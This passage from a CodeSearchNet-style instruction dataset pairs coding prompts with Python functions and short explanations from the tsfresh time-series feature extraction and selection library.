test_for_binary_target_real_feature: str\n\n    :param test_for_real_target_binary_feature: Which test to be used for real target, binary feature (currently unused)\n    :type test_for_real_target_binary_feature: str\n\n    :param test_for_real_target_real_feature: Which test to be used for real target, real feature (currently unused)\n    :type test_for_real_target_real_feature: str\n\n    :param fdr_level: The FDR level that should be respected, this is the theoretical expected percentage of irrelevant\n                      features among all created features.\n    :type fdr_level: float\n\n    :param hypotheses_independent: Can the significance of the features be assumed to be independent?\n                                   Normally, this should be set to False as the features are never\n                                   independent (e.g. mean and median)\n    :type hypotheses_independent: bool\n\n    :param n_jobs: Number of processes to use during the p-value calculation\n    :type n_jobs: int\n\n    :param chunksize: The size of one chunk that is submitted to the worker\n        process for the parallelisation.  Where one chunk is defined as a\n        singular time series for one id and one kind. If you set the chunksize\n        to 10, then it means that one task is to calculate all features for 10\n        time series.  If it is set it to None, depending on distributor,\n        heuristics are used to find the optimal chunksize. If you get out of\n        memory exceptions, you can try it with the dask distributor and a\n        smaller chunksize.\n    :type chunksize: None or int\n\n    :return: A pandas.DataFrame with each column of the input DataFrame X as index with information on the significance\n             of this particular feature. The DataFrame has the columns\n             \"Feature\",\n             \"type\" (binary, real or const),\n             \"p_value\" (the significance of this feature as a p-value, lower means more significant)\n             \"relevant\" (True if the Benjamini Hochberg procedure rejected the null hypothesis [the feature is\n             not relevant] for this feature)\n    :rtype: pandas.DataFrame\n    \"\"\"\n    if ml_task not in ['auto', 'classification', 'regression']:\n        raise ValueError('ml_task must be one of: \\'auto\\', \\'classification\\', \\'regression\\'')\n    elif ml_task == 'auto':\n        ml_task = infer_ml_task(y)\n\n    if n_jobs == 0:\n        map_function = map\n    else:\n        pool = Pool(n_jobs)\n        map_function = partial(pool.map, chunksize=chunksize)\n\n    relevance_table = pd.DataFrame(index=pd.Series(X.columns, name='feature'))\n    relevance_table['feature'] = relevance_table.index\n    relevance_table['type'] = pd.Series(\n        map_function(get_feature_type, [X[feature] for feature in relevance_table.index]),\n        index=relevance_table.index\n    )\n    table_real = relevance_table[relevance_table.type == 'real'].copy()\n    table_binary = relevance_table[relevance_table.type == 'binary'].copy()\n\n    table_const = relevance_table[relevance_table.type == 'constant'].copy()\n    table_const['p_value'] = np.NaN\n    table_const['relevant'] = False\n\n    if len(table_const) == len(relevance_table):\n        return table_const\n\n    if ml_task == 'classification':\n        tables = []\n        for label in y.unique():\n            _test_real_feature = partial(target_binary_feature_real_test, y=(y == label),\n                                              test=test_for_binary_target_real_feature)\n            _test_binary_feature = partial(target_binary_feature_binary_test, y=(y == label))\n            tmp = _calculate_relevance_table_for_implicit_target(\n                table_real, table_binary, X, _test_real_feature, _test_binary_feature, hypotheses_independent,\n                fdr_level, map_function\n            )\n            tables.append(tmp)\n        relevance_table = combine_relevance_tables(tables)\n    elif ml_task == 'regression':\n        _test_real_feature = partial(target_real_feature_real_test, y=y)\n        _test_binary_feature = partial(target_real_feature_binary_test, y=y)\n        relevance_table = _calculate_relevance_table_for_implicit_target(\n            table_real, table_binary, X, _test_real_feature, _test_binary_feature, hypotheses_independent, fdr_level,\n            map_function\n        )\n\n    relevance_table = pd.concat([relevance_table, table_const], axis=0)\n\n    if n_jobs != 0:\n        pool.close()\n        pool.terminate()\n        pool.join()\n\n    if sum(relevance_table['relevant']) == 0:\n        _logger.warning(\"No feature was found relevant for {} for fdr level = {}. \"\n                        \"Consider using a lower fdr level or other features.\".format(ml_task, fdr_level))\n\n    return relevance_table"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ninferring the machine learning task to select for.", "response": "def infer_ml_task(y):\n    \"\"\"\n    Infer the machine learning task to select for.\n    The result will be either `'regression'` or `'classification'`.\n    If the target vector only consists of integer typed values or objects, we assume the task is `'classification'`.\n    Else `'regression'`.\n\n    :param y: The target vector y.\n    :type y: pandas.Series\n    :return: 'classification' or 'regression'\n    :rtype: str\n    \"\"\"\n    if y.dtype.kind in np.typecodes['AllInteger'] or y.dtype == np.object:\n        ml_task = 'classification'\n    else:\n        ml_task = 'regression'\n\n    _logger.warning('Infered {} as machine learning task'.format(ml_task))\n    return ml_task"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a combined relevance table out of a list of relevance tables.", "response": "def combine_relevance_tables(relevance_tables):\n    \"\"\"\n    Create a combined relevance table out of a list of relevance tables,\n    aggregating the p-values and the relevances.\n\n    :param relevance_tables: A list of relevance tables\n    :type relevance_tables: List[pd.DataFrame]\n    :return: The combined relevance table\n    :rtype: pandas.DataFrame\n    \"\"\"\n    def _combine(a, b):\n        a.relevant |= b.relevant\n        a.p_value = a.p_value.combine(b.p_value, min, 1)\n        return a\n\n    return reduce(_combine, relevance_tables)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_feature_type(feature_column):\n    n_unique_values = len(set(feature_column.values))\n    if n_unique_values == 1:\n        _logger.warning(\"[test_feature_significance] Feature {} is constant\".format(feature_column.name))\n        return 'constant'\n    elif n_unique_values == 2:\n        return 'binary'\n    else:\n        return 'real'", "response": "Determines if a given feature is real binary or real."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef extract_features(timeseries_container, default_fc_parameters=None,\n                     kind_to_fc_parameters=None,\n                     column_id=None, column_sort=None, column_kind=None, column_value=None,\n                     chunksize=defaults.CHUNKSIZE,\n                     n_jobs=defaults.N_PROCESSES, show_warnings=defaults.SHOW_WARNINGS,\n                     disable_progressbar=defaults.DISABLE_PROGRESSBAR,\n                     impute_function=defaults.IMPUTE_FUNCTION,\n                     profile=defaults.PROFILING,\n                     profiling_filename=defaults.PROFILING_FILENAME,\n                     profiling_sorting=defaults.PROFILING_SORTING,\n                     distributor=None):\n    \"\"\"\n    Extract features from\n\n    * a :class:`pandas.DataFrame` containing the different time series\n\n    or\n\n    * a dictionary of :class:`pandas.DataFrame` each containing one type of time series\n\n    In both cases a :class:`pandas.DataFrame` with the calculated features will be returned.\n\n    For a list of all the calculated time series features, please see the\n    :class:`~tsfresh.feature_extraction.settings.ComprehensiveFCParameters` class,\n    which is used to control which features with which parameters are calculated.\n\n    For a detailed explanation of the different parameters and data formats please see :ref:`data-formats-label`.\n\n    Examples\n    ========\n\n    >>> from tsfresh.examples import load_robot_execution_failures\n    >>> from tsfresh import extract_features\n    >>> df, _ = load_robot_execution_failures()\n    >>> X = extract_features(df, column_id='id', column_sort='time')\n\n    :param timeseries_container: The pandas.DataFrame with the time series to compute the features for, or a\n            dictionary of pandas.DataFrames.\n    :type timeseries_container: pandas.DataFrame or dict\n\n    :param default_fc_parameters: mapping from feature calculator names to parameters. Only those names\n           which are keys in this dict will be calculated. See the class:`ComprehensiveFCParameters` for\n           more information.\n    :type default_fc_parameters: dict\n\n    :param kind_to_fc_parameters: mapping from kind names to objects of the same type as the ones for\n            default_fc_parameters. If you put a kind as a key here, the fc_parameters\n            object (which is the value), will be used instead of the default_fc_parameters. This means that kinds, for\n            which kind_of_fc_parameters doe not have any entries, will be ignored by the feature selection.\n    :type kind_to_fc_parameters: dict\n\n    :param column_id: The name of the id column to group by.\n    :type column_id: str\n\n    :param column_sort: The name of the sort column.\n    :type column_sort: str\n\n    :param column_kind: The name of the column keeping record on the kind of the value.\n    :type column_kind: str\n\n    :param column_value: The name for the column keeping the value itself.\n    :type column_value: str\n\n    :param n_jobs: The number of processes to use for parallelization. If zero, no parallelization is used.\n    :type n_jobs: int\n\n    :param chunksize: The size of one chunk that is submitted to the worker\n        process for the parallelisation.  Where one chunk is defined as a\n        singular time series for one id and one kind. If you set the chunksize\n        to 10, then it means that one task is to calculate all features for 10\n        time series.  If it is set it to None, depending on distributor,\n        heuristics are used to find the optimal chunksize. If you get out of\n        memory exceptions, you can try it with the dask distributor and a\n        smaller chunksize.\n    :type chunksize: None or int\n\n    :param: show_warnings: Show warnings during the feature extraction (needed for debugging of calculators).\n    :type show_warnings: bool\n\n    :param disable_progressbar: Do not show a progressbar while doing the calculation.\n    :type disable_progressbar: bool\n\n    :param impute_function: None, if no imputing should happen or the function to call for imputing.\n    :type impute_function: None or callable\n\n    :param profile: Turn on profiling during feature extraction\n    :type profile: bool\n\n    :param profiling_sorting: How to sort the profiling results (see the documentation of the profiling package for\n           more information)\n    :type profiling_sorting: basestring\n\n    :param profiling_filename: Where to save the profiling results.\n    :type profiling_filename: basestring\n\n    :param distributor: Advanced parameter: set this to a class name that you want to use as a\n             distributor. See the utilities/distribution.py for more information. Leave to None, if you want\n             TSFresh to choose the best distributor.\n    :type distributor: class\n\n    :return: The (maybe imputed) DataFrame containing extracted features.\n    :rtype: pandas.DataFrame\n    \"\"\"\n\n    # Always use the standardized way of storing the data.\n    # See the function normalize_input_to_internal_representation for more information.\n    df_melt, column_id, column_kind, column_value = \\\n        dataframe_functions._normalize_input_to_internal_representation(\n            timeseries_container=timeseries_container,\n            column_id=column_id, column_kind=column_kind,\n            column_sort=column_sort,\n            column_value=column_value)\n    # Use the standard setting if the user did not supply ones himself.\n    if default_fc_parameters is None and kind_to_fc_parameters is None:\n        default_fc_parameters = ComprehensiveFCParameters()\n    elif default_fc_parameters is None and kind_to_fc_parameters is not None:\n        default_fc_parameters = {}\n\n    # If requested, do profiling (advanced feature)\n    if profile:\n        profiler = profiling.start_profiling()\n\n    with warnings.catch_warnings():\n        if not show_warnings:\n            warnings.simplefilter(\"ignore\")\n        else:\n            warnings.simplefilter(\"default\")\n\n        result = _do_extraction(df=df_melt,\n                                column_id=column_id, column_value=column_value,\n                                column_kind=column_kind,\n                                n_jobs=n_jobs, chunk_size=chunksize,\n                                disable_progressbar=disable_progressbar,\n                                default_fc_parameters=default_fc_parameters,\n                                kind_to_fc_parameters=kind_to_fc_parameters,\n                                distributor=distributor)\n\n        # Impute the result if requested\n        if impute_function is not None:\n            impute_function(result)\n\n    # Turn off profiling if it was turned on\n    if profile:\n        profiling.end_profiling(profiler, filename=profiling_filename,\n                                sorting=profiling_sorting)\n\n    return result", "response": "Extract features from a time series container."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates the data in a list of individual time series containers.", "response": "def generate_data_chunk_format(df, column_id, column_kind, column_value):\n    \"\"\"Converts the dataframe df in into a list of individual time seriess.\n\n    E.g. the DataFrame\n\n        ====  ======  =========\n          id  kind          val\n        ====  ======  =========\n           1  a       -0.21761\n           1  a       -0.613667\n           1  a       -2.07339\n           2  b       -0.576254\n           2  b       -1.21924\n        ====  ======  =========\n\n    into\n\n        [(1, 'a', pd.Series([-0.217610, -0.613667, -2.073386]),\n         (2, 'b', pd.Series([-0.576254, -1.219238])]\n\n\n    The data is separated out into those single time series and the _do_extraction_on_chunk is\n    called on each of them. The results are then combined into a single pandas DataFrame.\n\n    The call is either happening in parallel or not and is showing a progress bar or not depending\n    on the given flags.\n\n    :param df: The dataframe in the normalized format which is used for extraction.\n    :type df: pd.DataFrame\n\n    :param column_id: The name of the id column to group by.\n    :type column_id: str\n\n    :param column_kind: The name of the column keeping record on the kind of the value.\n    :type column_kind: str\n\n    :param column_value: The name for the column keeping the value itself.\n    :type column_value: str\n\n    :return: the data in chunks\n    :rtype: list\n    \"\"\"\n    MAX_VALUES_GROUPBY = 2147483647\n\n    if df[[column_id, column_kind]].nunique().prod() >= MAX_VALUES_GROUPBY:\n        _logger.error(\n            \"The time series container has {} different ids and {} different kind of time series, in total {} possible combinations. \"\n            \"Due to a limitation in pandas we can only process a maximum of {} id/kind combinations. Please reduce your time series container and restart \"\n            \"the calculation\".format(\n                df[column_id].nunique(), df[column_kind].nunique(),\n                df[[column_id, column_kind]].nunique().prod(), MAX_VALUES_GROUPBY)\n        )\n        raise ValueError(\n            \"Number of ids/kinds are too high. Please reduce your data size and run feature extraction again.\")\n    data_in_chunks = [x + (y,) for x, y in\n                      df.groupby([column_id, column_kind], as_index=True)[column_value]]\n\n    return data_in_chunks"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nwraps around the _do_extraction_on_chunk, which calls it on all chunks in the data frame. A chunk is a subset of the data, with a given kind and id - so a single time series. The data is separated out into those single time series and the _do_extraction_on_chunk is called on each of them. The results are then combined into a single pandas DataFrame. The call is either happening in parallel or not and is showing a progress bar or not depending on the given flags. :param df: The dataframe in the normalized format which is used for extraction. :type df: pd.DataFrame :param default_fc_parameters: mapping from feature calculator names to parameters. Only those names which are keys in this dict will be calculated. See the class:`ComprehensiveFCParameters` for more information. :type default_fc_parameters: dict :param kind_to_fc_parameters: mapping from kind names to objects of the same type as the ones for default_fc_parameters. If you put a kind as a key here, the fc_parameters object (which is the value), will be used instead of the default_fc_parameters. :type kind_to_fc_parameters: dict :param column_id: The name of the id column to group by. :type column_id: str :param column_kind: The name of the column keeping record on the kind of the value. :type column_kind: str :param column_value: The name for the column keeping the value itself. :type column_value: str :param chunk_size: The size of one chunk for the parallelization :type chunk_size: None or int :param n_jobs: The number of processes to use for parallelization. If zero, no parallelization is used. :type n_jobs: int :param disable_progressbar: Do not show a progressbar while doing the calculation. :type disable_progressbar: bool :param distributor: Advanced parameter: See the utilities/distribution.py for more information. Leave to None, if you want TSFresh to choose the best distributor. :type distributor: DistributorBaseClass :return: the extracted features :rtype: pd.DataFrame", "response": "def _do_extraction(df, column_id, column_value, column_kind,\n                   default_fc_parameters, kind_to_fc_parameters,\n                   n_jobs, chunk_size, disable_progressbar, distributor):\n    \"\"\"\n    Wrapper around the _do_extraction_on_chunk, which calls it on all chunks in the data frame.\n    A chunk is a subset of the data, with a given kind and id - so a single time series.\n\n    The data is separated out into those single time series and the _do_extraction_on_chunk is\n    called on each of them. The results are then combined into a single pandas DataFrame.\n\n    The call is either happening in parallel or not and is showing a progress bar or not depending\n    on the given flags.\n\n    :param df: The dataframe in the normalized format which is used for extraction.\n    :type df: pd.DataFrame\n\n    :param default_fc_parameters: mapping from feature calculator names to parameters. Only those names\n           which are keys in this dict will be calculated. See the class:`ComprehensiveFCParameters` for\n           more information.\n    :type default_fc_parameters: dict\n\n    :param kind_to_fc_parameters: mapping from kind names to objects of the same type as the ones for\n            default_fc_parameters. If you put a kind as a key here, the fc_parameters\n            object (which is the value), will be used instead of the default_fc_parameters.\n    :type kind_to_fc_parameters: dict\n\n    :param column_id: The name of the id column to group by.\n    :type column_id: str\n\n    :param column_kind: The name of the column keeping record on the kind of the value.\n    :type column_kind: str\n\n    :param column_value: The name for the column keeping the value itself.\n    :type column_value: str\n\n    :param chunk_size: The size of one chunk for the parallelization\n    :type chunk_size: None or int\n\n    :param n_jobs: The number of processes to use for parallelization. If zero, no parallelization is used.\n    :type n_jobs: int\n\n    :param disable_progressbar: Do not show a progressbar while doing the calculation.\n    :type disable_progressbar: bool\n\n    :param distributor: Advanced parameter:  See the utilities/distribution.py for more information.\n                         Leave to None, if you want TSFresh to choose the best distributor.\n    :type distributor: DistributorBaseClass\n\n    :return: the extracted features\n    :rtype: pd.DataFrame\n    \"\"\"\n\n    data_in_chunks = generate_data_chunk_format(df, column_id, column_kind, column_value)\n\n    if distributor is None:\n        if n_jobs == 0:\n            distributor = MapDistributor(disable_progressbar=disable_progressbar,\n                                         progressbar_title=\"Feature Extraction\")\n        else:\n            distributor = MultiprocessingDistributor(n_workers=n_jobs,\n                                                     disable_progressbar=disable_progressbar,\n                                                     progressbar_title=\"Feature Extraction\")\n\n    if not isinstance(distributor, DistributorBaseClass):\n        raise ValueError(\"the passed distributor is not an DistributorBaseClass object\")\n\n    kwargs = dict(default_fc_parameters=default_fc_parameters,\n                  kind_to_fc_parameters=kind_to_fc_parameters)\n\n    result = distributor.map_reduce(_do_extraction_on_chunk, data=data_in_chunks,\n                                    chunk_size=chunk_size,\n                                    function_kwargs=kwargs)\n    distributor.close()\n\n    # Return a dataframe in the typical form (id as index and feature names as columns)\n    result = pd.DataFrame(result)\n    if result.columns.contains(\"value\"):\n        result[\"value\"] = result[\"value\"].astype(float)\n\n    if len(result) != 0:\n        result = result.pivot(\"id\", \"variable\", \"value\")\n        result.index = result.index.astype(df[column_id].dtype)\n\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _do_extraction_on_chunk(chunk, default_fc_parameters, kind_to_fc_parameters):\n    sample_id, kind, data = chunk\n    if kind_to_fc_parameters and kind in kind_to_fc_parameters:\n        fc_parameters = kind_to_fc_parameters[kind]\n    else:\n        fc_parameters = default_fc_parameters\n\n    def _f():\n        for function_name, parameter_list in fc_parameters.items():\n            func = getattr(feature_calculators, function_name)\n\n            # If the function uses the index, pass is at as a pandas Series.\n            # Otherwise, convert to numpy array\n            if getattr(func, 'input', False) == 'pd.Series':\n                # If it has a required index type, check that the data has the right index type.\n                index_type = getattr(func, 'index_type', None)\n                if index_type is not None:\n                    try:\n                        assert isinstance(data.index, index_type)\n                    except AssertionError:\n                        warnings.warn(\n                            \"{} requires the data to have a index of type {}. Results will \"\n                            \"not be calculated\".format(function_name, index_type)\n                        )\n                        continue\n                x = data\n            else:\n                x = data.values\n\n            if func.fctype == \"combiner\":\n                result = func(x, param=parameter_list)\n            else:\n                if parameter_list:\n                    result = ((convert_to_output_format(param), func(x, **param)) for param in\n                              parameter_list)\n                else:\n                    result = [(\"\", func(x))]\n\n            for key, item in result:\n                feature_name = str(kind) + \"__\" + func.__name__\n                if key:\n                    feature_name += \"__\" + str(key)\n                yield {\"variable\": feature_name, \"value\": item, \"id\": sample_id}\n\n    return list(_f())", "response": "This function is used to extract all features from a chunk."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_config_from_string(parts):\n    relevant_parts = parts[2:]\n    if not relevant_parts:\n        return\n\n    config_kwargs = [s.rsplit(\"_\", 1)[0] for s in relevant_parts]\n    config_values = [s.rsplit(\"_\", 1)[1] for s in relevant_parts]\n\n    dict_if_configs = {}\n\n    for key, value in zip(config_kwargs, config_values):\n        if value.lower() == \"nan\":\n            dict_if_configs[key] = np.NaN\n        elif value.lower() == \"-inf\":\n            dict_if_configs[key] = np.NINF\n        elif value.lower() == \"inf\":\n            dict_if_configs[key] = np.PINF\n        else:\n            dict_if_configs[key] = ast.literal_eval(value)\n\n    return dict_if_configs", "response": "This function extracts the configuration of a certain function from the column name."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef convert_to_output_format(param):\n\n    def add_parenthesis_if_string_value(x):\n        if isinstance(x, string_types):\n            return '\"' + str(x) + '\"'\n        else:\n            return str(x)\n\n    return \"__\".join(str(key) + \"_\" + add_parenthesis_if_string_value(param[key]) for key in sorted(param.keys()))", "response": "Helper function to convert parameters to a valid string in the output format."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef end_profiling(profiler, filename, sorting=None):\n    profiler.disable()\n    s = six.StringIO()\n    ps = pstats.Stats(profiler, stream=s).sort_stats(sorting)\n    ps.print_stats()\n\n    with open(filename, \"w+\") as f:\n        _logger.info(\"[calculate_ts_features] Finished profiling of time series feature extraction\")\n        f.write(s.getvalue())", "response": "End the profiling process and write out the profiled\n    data into a file."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef fit(self, X, y=None):\n            if not isinstance(X, pd.DataFrame):\n                X = pd.DataFrame(X)\n\n            col_to_max, col_to_min, col_to_median = get_range_values_per_column(X)\n\n            if self.col_to_NINF_repl_preset is not None:\n                if not set(X.columns) >= set(self.col_to_NINF_repl_preset.keys()):\n                    raise ValueError(\"Preset dictionary 'col_to_NINF_repl_preset' contain more keys \"\n                                     \"than the column names in X\")\n                col_to_min.update(self.col_to_NINF_repl_preset)\n            self._col_to_NINF_repl = col_to_min\n\n            if self.col_to_PINF_repl_preset is not None:\n                if not set(X.columns) >= set(self.col_to_PINF_repl_preset.keys()):\n                    raise ValueError(\"Preset dictionary 'col_to_PINF_repl_preset' contain more keys \"\n                                     \"than the column names in X\")\n                col_to_max.update(self.col_to_PINF_repl_preset)\n            self._col_to_PINF_repl = col_to_max\n\n            if self.col_to_NAN_repl_preset is not None:\n                if not set(X.columns) >= set(self.col_to_NAN_repl_preset.keys()):\n                    raise ValueError(\"Preset dictionary 'col_to_NAN_repl_preset' contain more keys \"\n                                     \"than the column names in X\")\n                col_to_median.update(self.col_to_NAN_repl_preset)\n            self._col_to_NAN_repl = col_to_median\n\n            return self", "response": "Compute the min max and median for all columns in the DataFrame."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef transform(self, X):\n\n            if not isinstance(X, pd.DataFrame):\n                X = pd.DataFrame(X)\n\n            if self._col_to_NINF_repl is None or self._col_to_PINF_repl is None or self._col_to_NAN_repl is None:\n                raise NotFittedError(\"PerColumnImputer is not fitted\")\n\n            X = impute_dataframe_range(X, self._col_to_PINF_repl, self._col_to_NINF_repl, self._col_to_NAN_repl)\n\n            return X", "response": "Column - wise replace all NaNs - inf and + inf in the DataFrame X with average / extreme\n            values from the provided dictionaries."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndownloads the Robot Execution Failures LP1 Data Set from the UCI Machine Learning Repository and store it locally.", "response": "def download_robot_execution_failures():\n    \"\"\"\n    Download the Robot Execution Failures LP1 Data Set[#1] from the UCI Machine Learning Repository [#2] and store it\n    locally.\n\n    :return:\n\n    Examples\n    ========\n\n    >>> from tsfresh.examples import download_robot_execution_failures\n    >>> download_robot_execution_failures()\n    \"\"\"\n    if os.path.exists(data_file_name):\n        _logger.warning(\"You have already downloaded the Robot Execution Failures LP1 Data Set.\")\n        return\n\n    if not os.access(module_path, os.W_OK):\n        raise RuntimeError(\"You don't have the necessary permissions to download the Robot Execution Failures LP1 Data \"\n                           \"Set into the module path. Consider installing the module in a virtualenv you \"\n                           \"own or run this function with appropriate permissions.\")\n\n    os.makedirs(os.path.dirname(data_file_name))\n\n    r = requests.get(UCI_MLD_REF_URL)\n\n    if r.status_code != 200:\n        raise RuntimeError(\"Could not download the Robot Execution Failures LP1 Data Set from the UCI Machine Learning \"\n                           \"Repository. HTTP status code: {}\".format(r.status_code))\n\n    with open(data_file_name, \"w\") as f:\n        f.write(r.text)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nloads the Robot Execution Failures LP1 Data Set [ 1 ].", "response": "def load_robot_execution_failures(multiclass=False):\n    \"\"\"\n    Load the Robot Execution Failures LP1 Data Set[1].\n    The Time series are passed as a flat DataFrame.\n\n    Examples\n    ========\n\n    >>> from tsfresh.examples import load_robot_execution_failures\n    >>> df, y = load_robot_execution_failures()\n    >>> print(df.shape)\n    (1320, 8)\n\n    :param multiclass: If True, return all target labels. The default returns only \"normal\" vs all other labels.\n    :type multiclass: bool\n    :return: time series data as :class:`pandas.DataFrame` and target vector as :class:`pandas.Series`\n    :rtype: tuple\n    \"\"\"\n    if not os.path.exists(data_file_name):\n        raise RuntimeError(UCI_MLD_REF_MSG)\n\n    id_to_target = {}\n    df_rows = []\n\n    with open(data_file_name) as f:\n        cur_id = 0\n        time = 0\n\n        for line in f.readlines():\n            # New sample --> increase id, reset time and determine target\n            if line[0] not in ['\\t', '\\n']:\n                cur_id += 1\n                time = 0\n                if multiclass:\n                    id_to_target[cur_id] = line.strip()\n                else:\n                    id_to_target[cur_id] = (line.strip() == 'normal')\n            # Data row --> split and convert values, create complete df row\n            elif line[0] == '\\t':\n                values = list(map(int, line.split('\\t')[1:]))\n                df_rows.append([cur_id, time] + values)\n                time += 1\n\n    df = pd.DataFrame(df_rows, columns=['id', 'time', 'F_x', 'F_y', 'F_z', 'T_x', 'T_y', 'T_z'])\n    y = pd.Series(id_to_target)\n\n    return df, y"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef extract_relevant_features(timeseries_container, y, X=None,\n                              default_fc_parameters=None,\n                              kind_to_fc_parameters=None,\n                              column_id=None, column_sort=None, column_kind=None, column_value=None,\n                              show_warnings=defaults.SHOW_WARNINGS,\n                              disable_progressbar=defaults.DISABLE_PROGRESSBAR,\n                              profile=defaults.PROFILING,\n                              profiling_filename=defaults.PROFILING_FILENAME,\n                              profiling_sorting=defaults.PROFILING_SORTING,\n                              test_for_binary_target_binary_feature=defaults.TEST_FOR_BINARY_TARGET_BINARY_FEATURE,\n                              test_for_binary_target_real_feature=defaults.TEST_FOR_BINARY_TARGET_REAL_FEATURE,\n                              test_for_real_target_binary_feature=defaults.TEST_FOR_REAL_TARGET_BINARY_FEATURE,\n                              test_for_real_target_real_feature=defaults.TEST_FOR_REAL_TARGET_REAL_FEATURE,\n                              fdr_level=defaults.FDR_LEVEL,\n                              hypotheses_independent=defaults.HYPOTHESES_INDEPENDENT,\n                              n_jobs=defaults.N_PROCESSES,\n                              chunksize=defaults.CHUNKSIZE,\n                              ml_task='auto'):\n    \"\"\"\n    High level convenience function to extract time series features from `timeseries_container`. Then return feature\n    matrix `X` possibly augmented with relevant features with respect to target vector `y`.\n\n    For more details see the documentation of :func:`~tsfresh.feature_extraction.extraction.extract_features` and\n    :func:`~tsfresh.feature_selection.selection.select_features`.\n\n    Examples\n    ========\n\n    >>> from tsfresh.examples import load_robot_execution_failures\n    >>> from tsfresh import extract_relevant_features\n    >>> df, y = load_robot_execution_failures()\n    >>> X = extract_relevant_features(df, y, column_id='id', column_sort='time')\n\n    :param timeseries_container: The pandas.DataFrame with the time series to compute the features for, or a\n            dictionary of pandas.DataFrames.\n            See :func:`~tsfresh.feature_extraction.extraction.extract_features`.\n\n    :param X: A DataFrame containing additional features\n    :type X: pandas.DataFrame\n\n    :param y: The target vector\n    :type y: pandas.Series\n\n    :param default_fc_parameters: mapping from feature calculator names to parameters. Only those names\n           which are keys in this dict will be calculated. See the class:`ComprehensiveFCParameters` for\n           more information.\n    :type default_fc_parameters: dict\n\n    :param kind_to_fc_parameters: mapping from kind names to objects of the same type as the ones for\n            default_fc_parameters. If you put a kind as a key here, the fc_parameters\n            object (which is the value), will be used instead of the default_fc_parameters.\n    :type kind_to_fc_parameters: dict\n\n    :param column_id: The name of the id column to group by.\n    :type column_id: str\n\n    :param column_sort: The name of the sort column.\n    :type column_sort: str\n\n    :param column_kind: The name of the column keeping record on the kind of the value.\n    :type column_kind: str\n\n    :param column_value: The name for the column keeping the value itself.\n    :type column_value: str\n\n    :param chunksize: The size of one chunk that is submitted to the worker\n        process for the parallelisation.  Where one chunk is defined as a\n        singular time series for one id and one kind. If you set the chunksize\n        to 10, then it means that one task is to calculate all features for 10\n        time series.  If it is set it to None, depending on distributor,\n        heuristics are used to find the optimal chunksize. If you get out of\n        memory exceptions, you can try it with the dask distributor and a\n        smaller chunksize.\n    :type chunksize: None or int\n\n    :param n_jobs: The number of processes to use for parallelization. If zero, no parallelization is used.\n    :type n_jobs: int\n\n    :param: show_warnings: Show warnings during the feature extraction (needed for debugging of calculators).\n    :type show_warnings: bool\n\n    :param disable_progressbar: Do not show a progressbar while doing the calculation.\n    :type disable_progressbar: bool\n\n    :param profile: Turn on profiling during feature extraction\n    :type profile: bool\n\n    :param profiling_sorting: How to sort the profiling results (see the documentation of the profiling package for\n           more information)\n    :type profiling_sorting: basestring\n\n    :param profiling_filename: Where to save the profiling results.\n    :type profiling_filename: basestring\n\n    :param test_for_binary_target_binary_feature: Which test to be used for binary target, binary feature (currently unused)\n    :type test_for_binary_target_binary_feature: str\n\n    :param test_for_binary_target_real_feature: Which test to be used for binary target, real feature\n    :type test_for_binary_target_real_feature: str\n\n    :param test_for_real_target_binary_feature: Which test to be used for real target, binary feature (currently unused)\n    :type test_for_real_target_binary_feature: str\n\n    :param test_for_real_target_real_feature: Which test to be used for real target, real feature (currently unused)\n    :type test_for_real_target_real_feature: str\n\n    :param fdr_level: The FDR level that should be respected, this is the theoretical expected percentage of irrelevant\n                      features among all created features.\n    :type fdr_level: float\n\n    :param hypotheses_independent: Can the significance of the features be assumed to be independent?\n                                   Normally, this should be set to False as the features are never\n                                   independent (e.g. mean and median)\n    :type hypotheses_independent: bool\n\n    :param ml_task: The intended machine learning task. Either `'classification'`, `'regression'` or `'auto'`.\n                    Defaults to `'auto'`, meaning the intended task is inferred from `y`.\n                    If `y` has a boolean, integer or object dtype, the task is assumend to be classification,\n                    else regression.\n    :type ml_task: str\n\n    :return: Feature matrix X, possibly extended with relevant time series features.\n    \"\"\"\n\n    assert isinstance(y, pd.Series), \"y needs to be a pandas.Series, received type: {}.\".format(type(y))\n    assert len(set(y)) > 1, \"Feature selection is only possible if more than 1 label/class is provided\"\n\n    if X is not None:\n        timeseries_container = restrict_input_to_index(timeseries_container, column_id, X.index)\n\n    ids_container = get_ids(df_or_dict=timeseries_container, column_id=column_id)\n    ids_y = set(y.index)\n    if ids_container != ids_y:\n        if len(ids_container - ids_y) > 0:\n            raise ValueError(\"The following ids are in the time series container but are missing in y: \"\n                             \"{}\".format(ids_container - ids_y))\n        if len(ids_y - ids_container) > 0:\n            raise ValueError(\"The following ids are in y but are missing inside the time series container: \"\n                             \"{}\".format(ids_y - ids_container))\n\n    X_ext = extract_features(timeseries_container,\n                             default_fc_parameters=default_fc_parameters,\n                             kind_to_fc_parameters=kind_to_fc_parameters,\n                             show_warnings=show_warnings,\n                             disable_progressbar=disable_progressbar,\n                             profile=profile,\n                             profiling_filename=profiling_filename,\n                             profiling_sorting=profiling_sorting,\n                             n_jobs=n_jobs,\n                             column_id=column_id, column_sort=column_sort,\n                             column_kind=column_kind, column_value=column_value,\n                             impute_function=impute)\n\n    X_sel = select_features(X_ext, y,\n                            test_for_binary_target_binary_feature=test_for_binary_target_binary_feature,\n                            test_for_binary_target_real_feature=test_for_binary_target_real_feature,\n                            test_for_real_target_binary_feature=test_for_real_target_binary_feature,\n                            